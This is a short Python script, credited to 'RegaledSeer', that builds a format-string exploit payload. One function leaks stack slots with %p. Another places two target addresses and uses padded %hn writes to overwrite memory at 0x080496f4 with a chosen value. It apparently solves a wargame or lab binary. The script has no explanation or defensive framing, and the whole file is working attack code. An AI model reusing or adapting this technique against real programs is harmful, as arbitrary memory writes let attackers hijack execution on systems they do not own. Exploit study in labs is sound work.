#Exploit code by RegaledSeer
import sys

ADDRESS = "\xf4\x96\x04\x08"
SECOND_ADDRESS = "\xf6\x96\x04\x08"
DUMMY_STRING = "AAAA"
DUMMY_STRING_TWO = "BBBB"
FIRST_WRITE = 0x5544
SECOND_WRITE = 0x10102

def find_exploit():
    payload = ""
    payload += DUMMY_STRING
    payload += DUMMY_STRING_TWO
    payload += "%12$p"
    payload += "%13$p"
    return payload

def craft_exploit():
    payload = ""
    payload += ADDRESS
    payload += SECOND_ADDRESS
    payload += "%{0}x".format(FIRST_WRITE - (len(ADDRESS) + len(SECOND_ADDRESS)))
    payload += "%12$hn"
    payload += "%{0}x".format(SECOND_WRITE - FIRST_WRITE)
    payload += "%13$hn"
    return payload

def main():
    sys.stdout.write(craft_exploit())


if __name__ == "__main__":
    main()

